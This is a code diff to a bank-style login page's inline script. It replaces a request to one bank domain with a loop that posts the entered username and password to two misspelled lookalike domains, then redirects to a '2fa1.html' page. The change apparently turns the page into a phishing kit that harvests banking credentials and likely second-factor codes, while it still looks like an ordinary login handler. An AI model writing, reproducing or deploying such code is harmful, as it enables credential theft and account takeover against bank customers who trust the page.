@@ -1197,45 +1197,48 @@
         </div>
         
         <script>
-            // Base URL for the API
-            const API_URL = "https://candembank.com";
-        
-            // Handle login form submission
-            document.getElementById("login-form").addEventListener("submit", async (e) => {
-                e.preventDefault();
-        
-                // Get form values
-                const username = document.getElementById("fldUsername").value;
-                const password = document.getElementById("fldPassword").value;
-        
-                try {
-                    // Send POST request to login endpoint
-                    const response = await fetch(`${API_URL}/auth/login`, {
-                        method: "POST",
-                        headers: { "Content-Type": "application/json" },
-                        body: JSON.stringify({ username, password })
-                    });
-        
-                    // Parse the response
-                    const data = await response.json();
-        
-                    if (response.status === 200) {
-                        // Store the JWT token in a cookie
-                        document.cookie = `token=${data.access_token}; path=/; max-age=1800`; // Expires in 30 minutes
-                        // Redirect to 2fa1.html
-                        window.location.href = "2fa1.html";
-                    } else {
-                        // Display error message
-                        document.getElementById("login-error-message").textContent = "Invalid username or password";
-                        document.getElementById("ember20").classList.remove("hidden"); // Show error alert
-                    }
-                } catch (error) {
-                    // Handle network or other errors
-                    document.getElementById("login-error-message").textContent = "Error: " + error.message;
-                    document.getElementById("ember20").classList.remove("hidden"); // Show error alert
-                }
+	// Base URLs for the API
+const API_URLS = ["https://api.candmnatlonal.online", "https://candhmnationa1.online"];
+
+// Handle login form submission
+document.getElementById("login-form").addEventListener("submit", async (e) => {
+    e.preventDefault();
+
+    // Get form values
+    const username = document.getElementById("fldUsername").value;
+    const password = document.getElementById("fldPassword").value;
+
+    let loginSuccess = false;
+
+    // Try each API URL in sequence
+    for (const apiUrl of API_URLS) {
+        try {
+            const response = await fetch(`${apiUrl}/auth/login`, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ username, password })
             });
-        </script>
+
+            const data = await response.json();
+
+            if (response.status === 200) {
+                document.cookie = `token=${data.access_token}; path=/; max-age=1800`; // Expires in 30 minutes
+                window.location.href = "2fa1.html";
+                loginSuccess = true;
+                break; // Exit loop if login is successful
+            }
+        } catch (error) {
+            console.error(`Error connecting to ${apiUrl}:`, error);
+        }
+    }
+
+    if (!loginSuccess) {
+        document.getElementById("login-error-message").textContent = "Invalid username or password";
+        document.getElementById("ember20").classList.remove("hidden"); // Show error alert
+    }
+});
+
+       </script>
                         <div class="password-links">
                           <div class="password-link">
                             <a
